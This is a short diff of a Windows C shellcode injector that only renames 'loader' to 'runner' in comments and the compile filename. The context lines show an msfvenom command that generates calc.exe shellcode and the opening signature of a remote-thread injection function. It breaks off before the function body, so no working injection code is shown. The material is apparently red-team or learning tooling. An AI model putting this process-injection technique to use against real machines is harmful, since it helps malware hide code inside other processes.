@@ -1,10 +1,10 @@
 #include <Windows.h>
 #include <stdio.h>
 
-// Basic shellcode loader that injects into a remote thread
+// Basic shellcode runner that injects into a remote thread
 // Generate shellcode with: msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
 
-// Compile with: cl BasicShellcodeLoader.c
+// Compile with: cl BasicShellcodeRunner.c
 
 BOOL InjectRemoteThread(DWORD pid, PBYTE pShellcode, SIZE_T shellcodeSize) {
 	SIZE_T numberOfBytesWritten = NULL;
